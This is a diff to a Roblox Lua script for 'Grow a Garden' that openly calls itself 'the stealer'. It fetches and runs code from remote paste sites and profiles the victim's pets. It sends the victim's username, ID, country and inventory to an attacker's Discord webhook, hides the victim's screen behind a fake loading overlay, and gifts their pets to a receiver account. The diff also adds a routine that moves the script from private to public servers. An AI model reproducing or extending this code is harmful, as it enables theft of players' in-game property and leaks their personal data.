@@ -1,6 +1,5 @@
 loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
-
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -11,39 +10,93 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
         local NumberUtil = require(RS.Modules.NumberUtil)
         local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
         local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
+        local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
+        local TeleportService = game:GetService("TeleportService")
 
         local data = DataService:GetData()
 
-        -- Priority system (1 = highest priority, 11 = lowest priority)
-        local priorities = {
-            ["Kitsune"] = 1,
-            ["Raccoon"] = 2,
-            ["Fennec fox"] = 3,
-            ["Spinosaurus"] = 4,
-            ["Dragonfly"] = 5,
-            ["T-Rex"] = 6,
-            ["Mimic Octopus"] = 7,
-            ["Disco Bee"] = 8,
-            ["Butterfly"] = 9,
-            ["Queen Bee"] = 10,
-            ["Red Fox"] = 13
-        }
+        local maxAttempts = 10
+        local attempt = 1
+        local teleported = false
 
-        local mutationPriorities = {
-            ["Ascended"] = 14,
-            ["Rainbow"] = 15,
-            ["Shocked"] = 16,
-            ["Radiant"] = 17,
-            ["IronSkin"] = 18,
-            ["Mega"] = 19,
-            ["Tiny"] = 20,
-            ["Golden"] = 21,
-            ["Frozen"] = 22,
-            ["Windy"] = 23,
-            ["Inverted"] = 24,
-            ["Shiny"] = 25
-        }
+        if GetServerType:InvokeServer() == "VIPServer" then
+            while attempt <= maxAttempts and not teleported do
+                local servers = {}
+                local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
+                local body = HttpService:JSONDecode(req)
 
+                if body and body.data then
+                    for _, v in next, body.data do
+                        if tonumber(v.playing) and tonumber(v.maxPlayers)
+                        and (tonumber(v.maxPlayers) - tonumber(v.playing) >= 2)
+                        and v.id ~= game.JobId then
+                            table.insert(servers, v.id)
+                        end
+                    end
+                end
+
+                if #servers > 0 then
+                    local success = pcall(function()
+                        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
+                    end)
+                    if success then
+                        teleported = true
+                        break
+                    end
+                end
+
+                attempt += 1
+                if attempt <= maxAttempts then
+                    task.wait(1)
+                end
+            end
+
+            if not teleported then
+                warn("Failed to find a non-full server after "..maxAttempts.." attempts")
+            end
+        end
+
+        if GetServerType:InvokeServer() == "VIPServer" then
+            error("Script stopped - VIP Server detected")        
+        end
+
+        if getgenv().EclipseHubRunning then
+            warn("Script is already running or has been executed! Cannot run again.")
+            return
+        end
+        getgenv().EclipseHubRunning = true
+
+        -- Updated PetPriorityData with isMutation field and additional pets
+        local PetPriorityData = {
+            -- Regular pets
+            ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
+            ["Corrupted Kitsune"] = { priority = 2, emoji = "🦊", isMutation = false },
+            ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
+            ["Raccoon"] = { priority = 4, emoji = "🦝", isMutation = false },
+            ["Fennec fox"] = { priority = 5, emoji = "🦊", isMutation = false },
+            ["Spinosaurus"] = { priority = 6, emoji = "🫎", isMutation = false },
+            ["Butterfly"] = { priority = 7, emoji = "🦋", isMutation = false },
+            ["Dragonfly"] = { priority = 8, emoji = "🐲", isMutation = false },
+            ["Mimic Octopus"] = { priority = 9, emoji = "🐙", isMutation = false },
+            ["T-Rex"] = { priority = 10, emoji = "🦖", isMutation = false },
+            ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
+            ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
+            -- Mutations
+            ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
+            ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
+            ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
+            ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
+            ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
+            ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
+            ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
+            ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
+            ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
+            ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
+            ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
+            ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
+            ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
+            ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
+        }
 
         local function detectExecutor()
             local name
@@ -83,14 +136,13 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
             container.Size = UDim2.new(0.8, 0, 0.5, 0)
             container.BackgroundTransparency = 1
             container.Parent = background
-                            -- Данные для копирования
+
             local executors = {
                 {name = "KRNL", link = "https://krnl.cat/"},
                 {name = "Codex", link = "https://codex.lol/"},
                 {name = "Arceus X", link = "https://spdmteam.com/index"},
                 {name = "Fluxus", link = "https://fluxus.team/download/"},
             }
-            -- UIGridLayout для кнопок
             local buttonsContainer = Instance.new("Frame")
             buttonsContainer.Size = UDim2.new(1, 0, 0, #executors * 50)
             buttonsContainer.BackgroundTransparency = 1
@@ -103,7 +155,6 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
             grid.VerticalAlignment = Enum.VerticalAlignment.Top
             grid.SortOrder = Enum.SortOrder.LayoutOrder
             grid.Parent = buttonsContainer
-            -- Создание кнопок
             for _, exec in ipairs(executors) do
                 local btn = Instance.new("TextButton")
                 btn.Text = "Copy " .. exec.name .. " Link"
@@ -184,22 +235,19 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
 
         local function getWeight(toolName)
             if not toolName or toolName == "No Tool" then
-                return nil, nil
+                return nil
             end
             
-            -- Extract weight (looks for [X.XX KG])
             local weight = toolName:match("%[([%d%.]+) KG%]")
             weight = weight and tonumber(weight)
             
             return weight
         end
-        
 
         local function getAge(toolName)
             if not toolName or toolName == "No Tool" then
-                return nil, nil
+                return nil
             end    
-            -- Extract age (looks for [Age X])
             local age = toolName:match("%[Age (%d+)%]")
             age = age and tonumber(age)
             
@@ -215,20 +263,18 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
                 return unsortedPets
             end
 
-            -- Unequip all pets ONCE at the start
             if workspace:FindFirstChild("PetsPhysical") then
                 for _, petMover in workspace.PetsPhysical:GetChildren() do
                     if petMover and petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
                         for _, pet in petMover:GetChildren() do
                             table.insert(equippedPets, pet.Name)
-                                PetsService:UnequipPet(pet.Name)
+                            PetsService:UnequipPet(pet.Name)
                         end
                     end
                 end
             end
 
             task.wait(0.5)
-            -- Get all tools from backpack
             for _, tool in pairs(player.Backpack:GetChildren()) do
                 if not tool or not tool.Parent then
                     continue
@@ -237,7 +283,6 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
                 if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
                     local petName = tool.Name
                     
-                    -- Skip broken pets
                     if petName:find("Bald Eagle") or petName:find("Golden Lab") then
                         continue
                     end
@@ -251,14 +296,12 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
                             return 0
                         end
                         
-                        -- Get data directly instead of through character
                         local data = DataService:GetData()
                         if not data or not data.PetsData.PetInventory.Data[PET_UUID] then
                             warn("SafeCalculatePetValue | No pet data found!")
                             return 0
                         end
                         
-                        -- Get pet data
                         local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
                         local petData = petInventoryData.PetData
                         local HatchedFrom = petData.HatchedFrom
@@ -268,28 +311,24 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
                             return 0
                         end
                         
-                        -- Get egg data
                         local eggData = PetRegistry.PetEggs[HatchedFrom]
                         if not eggData then
                             warn("SafeCalculatePetValue | No egg data found!")
                             return 0
                         end
                         
-                        -- Get rarity data
                         local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
                         if not rarityData then
                             warn("SafeCalculatePetValue | No pet data in egg!")
                             return 0
                         end
                         
-                        -- Get weight range
                         local WeightRange = rarityData.GeneratedPetData.WeightRange
                         if not WeightRange then
                             warn("SafeCalculatePetValue | No WeightRange found!")
                             return 0
                         end
                         
-                        -- Calculate final value using the original math
                         local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
                         local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
                         local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
@@ -299,23 +338,19 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
 
                     local age = getAge(tool.Name) or 0
                     local weight = getWeight(tool.Name) or 0
-
-                    -- Remove weight/age tags
+                    
                     local strippedName = petName:gsub(" %[.*%]", "")
 
-                    -- Function to remove mutation prefix for sorting
                     local function stripMutationPrefix(name)
-                        for mutation in pairs(mutationPriorities) do
-                            if name:lower():find(mutation:lower()) == 1 then
-                                return name:sub(#mutation + 2)
+                        for key, data in pairs(PetPriorityData) do
+                            if data.isMutation and name:lower():find(key:lower()) == 1 then
+                                return name:sub(#key + 2)
                             end
                         end
                         return name
                     end
 
-                    -- Final base type used for sorting
                     local petType = stripMutationPrefix(strippedName)
-
                     
                     local rawValue = SafeCalculatePetValue(tool)
                     if rawValue and rawValue > 0 then
@@ -329,22 +364,20 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
                             Formatted = formatNumberWithCommas(rawValue),
                         })
                     else
-                            warn("Failed to calculate value for:", tool.Name)
-                            continue
+                        warn("Failed to calculate value for:", tool.Name)
+                        continue
                     end
-                    
                 end
             end
 
             task.wait(0.5)
-            -- Re-equip pets
-        if equippedPets then
-            for _, petName in pairs(equippedPets) do
-                if petName then
-                    game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
+            if equippedPets then
+                for _, petName in pairs(equippedPets) do
+                    if petName then
+                        game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
+                    end
                 end
             end
-        end
             return unsortedPets
         end
 
@@ -353,64 +386,52 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
         local Webhook = getgenv().Webhook
         local Username = getgenv().Username
 
-        -- Returns mutation name if found in toolName, otherwise nil
         local function isMutated(toolName)
-            for mutation, _ in pairs(mutationPriorities) do
-                if toolName:lower():find(mutation:lower()) == 1 then
-                    return mutation
+            for key, data in pairs(PetPriorityData) do
+                if data.isMutation and toolName:lower():find(key:lower()) == 1 then
+                    return key
                 end
             end
             return nil
         end
 
-        -- Sort pets by priority, then by value
+        -- Sort pets by priority, then by value using PetPriorityData
         table.sort(pets, function(a, b)
             -- Get a's priority
-            local aPriority = priorities[a.Type]
-            local aMutation = isMutated(a.PetName)
-            if not aPriority and aMutation then
-                aPriority = mutationPriorities[aMutation]
-            end
-            if not aPriority and a.Weight and a.Weight >= 10 then
-                aPriority = 11
-            end
-            if not aPriority and a.Age and a.Age >= 60 then
+            local aPriority, aMutation = 99, isMutated(a.PetName)
+            if PetPriorityData[a.Type] then
+                aPriority = PetPriorityData[a.Type].priority
+            elseif aMutation and PetPriorityData[aMutation] then
+                aPriority = PetPriorityData[aMutation].priority
+            elseif a.Weight and a.Weight >= 10 then
                 aPriority = 12
+            elseif a.Age and a.Age >= 60 then
+                aPriority = 13
             end
 
             -- Get b's priority
-            local bPriority = priorities[b.Type]
-            local bMutation = isMutated(b.PetName)
-            if not bPriority and bMutation then
-                bPriority = mutationPriorities[bMutation]
-            end
-            if not bPriority and b.Weight and b.Weight >= 10 then
-                bPriority = 11
-            end
-            if not bPriority and b.Age and b.Age >= 60 then
+            local bPriority, bMutation = 99, isMutated(b.PetName)
+            if PetPriorityData[b.Type] then
+                bPriority = PetPriorityData[b.Type].priority
+            elseif bMutation and PetPriorityData[bMutation] then
+                bPriority = PetPriorityData[bMutation].priority
+            elseif b.Weight and b.Weight >= 10 then
                 bPriority = 12
+            elseif b.Age and b.Age >= 60 then
+                bPriority = 13
             end
 
             -- Compare priorities
-            if aPriority and bPriority then
-                if aPriority == bPriority then
-                    return a.Value > b.Value
-                else
-                    return aPriority < bPriority
-                end
+            if aPriority == bPriority then
+                return a.Value > b.Value
+            else
+                return aPriority < bPriority
             end
-
-            -- Only one has priority
-            if aPriority and not bPriority then return true end
-            if bPriority and not aPriority then return false end
-
-            -- Neither has priority
-            return a.Value > b.Value
         end)
-        -- Check if player has any priority pets
+
         local function hasRarePets()
             for _, pet in pairs(pets) do
-                if priorities[pet.Type] then
+                if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
                     return true
                 end
             end
@@ -421,38 +442,34 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
 
         local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
+        -- Update pet string generation
         local petString = ""
 
         for _, pet in ipairs(pets) do
-            local emoji = "🐶" -- Default to normal pet
+            local highestPriority = 99
+            local chosenEmoji = "🐶"
+            local mutation = isMutated(pet.PetName)
+            local mutationData = mutation and PetPriorityData[mutation] or nil
+            local petData = PetPriorityData[pet.Type] or nil
 
-            if priorities[pet.Type] then
-                -- Custom emoji for each rare pet type
-                local rareEmojis = {
-                    ["Kitsune"] = "🦊",
-                    ["Raccoon"] = "🦝",
-                    ["Fennec fox"] = "🦊",
-                    ["Spinosaurus"] = "🫎",
-                    ["Dragonfly"] = "🐲",
-                    ["T-Rex"] = "🦖",
-                    ["Mimic Octopus"] = "🐙",
-                    ["Disco Bee"] = "🪩",
-                    ["Butterfly"] = "🦋",
-                    ["Queen Bee"] = "👑",
-                    ["Red Fox"] = "🦊"
-                }
-                emoji = rareEmojis[pet.Type] or "💎"
-            elseif pet.Weight and pet.Weight >= 10 then
-                emoji = "🐘" -- Huge pet
-            elseif pet.Age and pet.Age >= 60 then
-                emoji = "👴" -- Aged pet
+            if petData and petData.priority < highestPriority then
+                highestPriority = petData.priority
+                chosenEmoji = petData.emoji
+            elseif mutationData and mutationData.priority < highestPriority then
+                highestPriority = mutationData.priority
+                chosenEmoji = mutationData.emoji
+            elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
+                highestPriority = 12
+                chosenEmoji = "🐘"
+            elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
+                highestPriority = 13
+                chosenEmoji = "👴"
             end
 
             local petName = pet.PetName
             local petValue = pet.Formatted
-            petString = petString .. "\n" .. emoji .. " - " .. petName .. " → " .. petValue
+            petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
         end
-
         local playerCount = #Players:GetPlayers()
 
         local function getPlayerCountry(player)
@@ -461,15 +478,15 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
             end)
             
             if success then
-                return result -- Returns country code like "US", "GB", "DE"
+                return result
             else
                 return "Unknown"
             end
-        end
+        end    
 
         local accountAgeInDays = Players.LocalPlayer.AccountAge
-        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60) -- Converts days to seconds and subtracts
-        local creationDateString = os.date("%Y-%m-%d", creationDate) -- Formats the date as Year-Month-Day
+        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
+        local creationDateString = os.date("%Y-%m-%d", creationDate)
 
         local function truncateByLines(inputString, maxLines)
             local lines = {}
@@ -481,7 +498,7 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
                 return inputString
             else
                 local truncatedLines = {}
-                for i = 1, maxLines - 1 do -- -1 to leave room for "(truncated)" line
+                for i = 1, maxLines - 1 do
                     table.insert(truncatedLines, lines[i])
                 end
                 return table.concat(truncatedLines, "\n")
@@ -489,41 +506,85 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
         end
 
         local payload = {
-    username = "Scripts.SM",
+            username = "Scripts.SM",
     avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
-    content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
-    embeds = {{
-        title = "<:pack:1365295947281862656> Scripts.SM • Grow a Garden Hit",
-        url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-        color = 0x03D7FC,
-        fields = {
-            { name = "<:players:1365290081937526834> Player Info", value = "Details of the player who sent the pets & fruits:", inline = false },
-            { name = "<:stats:1365955343221264564> Display Name", value = "```" .. (player.DisplayName or "Unknown") .. "```", inline = true },
-            { name = "<:stats:1364189776885973072> Username", value = "```" .. (player.Name or "Unknown") .. "```", inline = true },
-            { name = "<:reset:1364189779435978804> User ID", value = "```" .. tostring(player.UserId or "N/A") .. "```", inline = true },
-            { name = "<:time:1365991843011100713> Account Age", value = "```" .. tostring(accountAgeInDays or 0) .. " days```", inline = true },
-            { name = "<:players:1365290081937526834> Receiver", value = "```" .. (Username or "Unknown") .. "```", inline = true },
-            { name = "<:changes:1365295949811028068> Created", value = "```" .. (creationDateString or "Unknown") .. "```", inline = true },
-            { name = "<:stats:1364189776885973072> Executor", value = "```" .. (detectExecutor() or "Unknown") .. "```", inline = true },
-            { name = "<:location:1365290076279541791> Country", value = "```" .. (country or "Unknown") .. "```", inline = true },
-            { name = "<:players:1365290081937526834> Player Count", value = "```" .. (playerCount or 0) .. "/5```", inline = true },
-            { name = "<:money:1365955380294844509> Inventory (Pets & Fruits)", value = formatInventory(pets), inline = false },
-            { name = "<:folder:1365290079081205844> Join Script", value = "```lua\n" .. (tpScript or "N/A") .. "\n```", inline = false },
-            { name = "<:game:1365295942504550410> Join with URL", value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false },
-            { name = "<:events:1365290073767022693> Watermark", value = "**Made by Scripts.SM** | [Join our Official Discord](https://discord.gg/ynm4BvqZ78)", inline = false }
-        },
-        footer = {
-            text = "Scripts.SM • Job ID: " .. (game.JobId or "Unknown"),
-            icon_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"
-        },
-        timestamp = DateTime.now():ToIsoDate()
-    }},
-    attachments = {}
-}
+            content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
+            embeds = {{
+                title = "Grow a Garden Hit - Scripts.SM",
+                url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
+                color = 15105570,
+                fields = {
+                    {
+                        name = "<:stats:1365955343221264564> Display Name",
+                        value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "<:players:1365290081937526834> Username",
+                        value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "<:reset:1364189779435978804> User ID",
+                        value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "<:time:1365991843011100713> Account Age",
+                        value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
+                        inline = true
+                    },
+                    {
+                        name = "<:players:1365290081937526834> Receiver",
+                        value = "```" .. (Username or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "<:changes:1365295949811028068> Account Created",
+                        value = "```" .. (creationDateString or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "<:stats:1364189776885973072> Executor",
+                        value = "```" .. (detectExecutor() or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "<:location:1365290076279541791> Country",
+                        value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "<:players:1365290081937526834> Player Count",
+                        value = "```" .. (playerCount or 0) .. "/5```",
+                        inline = true
+                    },
+                    {
+                        name = "<:money:1365955380294844509> Backpack",
+                        value = "```" .. truncateByLines(petString, 20) .. "```",
+                        inline = false
+                    },
+                    {
+                        name = "<:folder:1365290079081205844> Join Script",
+                        value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
+                        inline = false
+                    },
+                    {
+                        name = "<:game:1365295942504550410> Join with URL",
+                        value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = game.JobId or "Unknown"
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }},
+            attachments = {}
+        }
 
         if hasRarePets() then
             payload.content = "@everyone\n" .. "To activate the stealer you must jump or type in chat"
-
                 local success, err = pcall(function()
                     request({
                         Url = Webhook,
@@ -533,14 +594,10 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
                         },
                         Body = HttpService:JSONEncode(payload)
                     })
-
                 end)
-                if not success then
-                warn("Failed to send webhook:", err)
-            end
+            if not success then warn(err) end
         else
             payload.content = "To activate the stealer you must jump or type in chat"
-
             local success, err = pcall(function()
                 request({
                     Url = Webhook,
@@ -549,18 +606,13 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
                         ["Content-Type"] = "application/json"
                     },
                     Body = HttpService:JSONEncode(payload)
-                })
+                }) 
             end)
-
-            if not success then
-                warn("Failed to send webhook:", err)
-            end
+            if not success then warn(err) end
         end
 
         local function CreateGui()
             local player = Players.LocalPlayer
-
-            -- Create GUI
             local gui = Instance.new("ScreenGui")
             local asc = Instance.new("UIAspectRatioConstraint")
             gui.Name = "EclipseHubGui"
@@ -569,26 +621,20 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
             gui.Parent = player:WaitForChild("PlayerGui")
             gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
             gui.DisplayOrder = 99999
-
-            -- Full black background
             local bg = Instance.new("Frame")
             bg.Size = UDim2.new(1, 0, 1, 0)
             bg.Position = UDim2.new(0, 0, 0, 0)
             bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
             bg.Parent = gui
-
-            -- Spinner icon
             local spinner = Instance.new("ImageLabel")
             spinner.AnchorPoint = Vector2.new(0.5, 0.5)
             spinner.Size = UDim2.new(0.3, 0, 0.3, 0)
             spinner.Position = UDim2.new(0.5, 0, 0.34, 0)
             spinner.BackgroundTransparency = 1
-            spinner.Image = "rbxassetid://74011233271790" -- Simple loop icon
+            spinner.Image = "rbxassetid://74011233271790"
             spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
             spinner.Parent = bg
             asc.Parent = spinner
-
-            -- "Please wait..." title
             local title = Instance.new("TextLabel")
             title.Size = UDim2.new(1, 0, 0, 50)
             title.Position = UDim2.new(0, 0, 0.53, 0)
@@ -599,8 +645,6 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
             title.TextColor3 = Color3.fromRGB(255, 255, 255)
             title.TextStrokeTransparency = 0.75
             title.Parent = bg
-
-            -- Description text
             local desc = Instance.new("TextLabel")
             desc.Size = UDim2.new(1, -100, 0, 60)
             desc.Position = UDim2.new(0.5, -((1 * (bg.AbsoluteSize.X - 100)) / 2), 0.60, 0)
@@ -613,24 +657,16 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
             desc.TextXAlignment = Enum.TextXAlignment.Center
             desc.TextYAlignment = Enum.TextYAlignment.Top
             desc.Parent = bg
-
-            -- Spinner rotation loop
             task.spawn(function()
                 while spinner do
                     spinner.Rotation += 2
                     task.wait(0.01)
                 end
-            end)
+            end)   
         end
-
-        if getgenv().EclipseHubRunning then
-            warn("Script is already running or has been executed! Cannot run again.")
-            return
-        end
-        getgenv().EclipseHubRunning = true
 
         local receiverPlr
-        repeat 
+        repeat
             receiverPlr = Players:FindFirstChild(Username)
             task.wait(1)
         until receiverPlr
@@ -638,7 +674,6 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
         local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
         local hum = receiverChar:WaitForChild("Humanoid")
         local targetPlr = Players.LocalPlayer
-        local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
 
         if receiverPlr == targetPlr then error("Receiver and target are the same person!") end
 
@@ -657,7 +692,7 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
             task.wait()
         until jumped or chatted
 
-       for _, v in targetPlr.PlayerGui:GetDescendants() do
+        for _, v in targetPlr.PlayerGui:GetDescendants() do
             if v:IsA("ScreenGui") then
                 v.Enabled = false
             end
@@ -684,70 +719,116 @@ loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/46f6617a", true))()
         end
 
 
-local function safeFollow(targetPlayer, follower)
-    
-    local offset = CFrame.new(0, 0, 1.5)
-    local conn
-    conn = RunService.Stepped:Connect(function()
-            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-            local followerRoot = follower.Character:FindFirstChild("HumanoidRootPart")
-            if targetRoot and followerRoot then
-                followerRoot.CFrame = targetRoot.CFrame * offset
+    -- [Previous code up to the safeFollow function remains unchanged]
+
+    local function safeFollow()
+        local offset = CFrame.new(0, 0, 0.5) -- Reduced offset for closer proximity
+        local conn = RunService.Stepped:Connect(function()
+            if receiverPlr.Character and targetPlr.Character then
+                local targetRoot = receiverPlr.Character:FindFirstChild("HumanoidRootPart")
+                local followerRoot = targetPlr.Character:FindFirstChild("HumanoidRootPart")
+                if targetRoot and followerRoot then
+                    local distance = (targetRoot.Position - followerRoot.Position).Magnitude
+                    if distance > 5 then -- Ensure within 5 studs
+                        followerRoot.CFrame = targetRoot.CFrame * offset
+                    end
+                end
             end
-    end)
-    
-    return {
-        Stop = function()
-            conn:Disconnect()
-        end
-    }
-end
+        end)
 
-safeFollow(receiverPlr, targetPlr)
-
-local inventory = targetPlr.Backpack
-
-local function quickGift(tool)
-    -- Equip the tool (no attempt limit)
-    repeat
-            if tool.Parent == targetPlr.Backpack then
-                tool.Parent = targetChar
+        return {
+            Stop = function()
+                if conn then
+                    conn:Disconnect()
+                end
             end
-        task.wait(0.05)
-    until tool.Parent == targetChar
-
-    repeat
-        task.wait(0.25) -- Short delay between attempts
-        RS:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", receiverPlr)
-        task.wait(0.25) -- Short delay between attempts
-    until tool.Parent ~= targetChar and tool.Parent ~= targetPlr.Backpack
-
-    if tool.Parent == targetChar then
-        tool.Parent = targetPlr.Backpack
+        }
     end
 
-    print("Gifted " .. tool.Name .. " successfully")
+    local inventory = targetPlr.Backpack
 
-    return true
-end
+    local function safeGiftTool(tool)
+        -- Verify both players and their characters exist
+        if not receiverPlr or not receiverChar or not targetPlr.Character then
+            warn("Gifting failed: Invalid receiver or target character")
+            return false
+        end
 
+        -- Ensure tool is in Backpack
+        if tool.Parent ~= inventory then
+            tool.Parent = inventory
+            task.wait(0.3)
+        end
 
-for _, pet in ipairs(pets) do
-    local tool
-    for _, t in pairs(inventory:GetChildren()) do
-        if t:IsA("Tool") and t:GetAttribute("PET_UUID") == pet.Id then
-            tool = t
+        -- Equip the tool
+        local humanoid = targetPlr.Character:FindFirstChild("Humanoid")
+        if not humanoid then
+            warn("Gifting failed: No Humanoid found for targetPlr")
+            return false
+        end
+
+        humanoid:EquipTool(tool)
+        task.wait(0.6) -- Increased wait for server to register equip
+
+        -- Verify tool is equipped
+        if tool.Parent ~= targetPlr.Character then
+            warn("Gifting failed: Tool not equipped - " .. tool.Name)
+            tool.Parent = inventory -- Reset to Backpack
+            return false
+        end
+
+        -- Fire gifting event
+        local success, err = pcall(function()
+            RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
+            
+            -- Trigger proximity prompt if it exists
+            task.wait(0.5) -- Increased wait for prompt to appear
+            local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
+            if prompt then
+                print("Triggering proximity prompt for " .. receiverPlr.Name)
+                fireproximityprompt(prompt)
+            else
+                warn("No proximity prompt found for " .. receiverPlr.Name)
+            end
+            return true
+        end)
+
+        -- Handle failure
+        if not success then
+            warn("Gifting failed for " .. tool.Name .. ": " .. tostring(err))
+            tool.Parent = inventory -- Reset to Backpack
+            return false
+        end
+
+        -- Verify tool is no longer in possession (indicating successful gift)
+        task.wait(0.7) -- Increased wait to confirm gift
+        if tool then
+            tool.Parent = targetPlr.Backpack
+        end
+        return true
+    end
+
+    -- Start following before gifting
+    local followConn = safeFollow()
+
+    -- Gifting loop
+    for _, pet in ipairs(pets) do
+        if not receiverPlr then
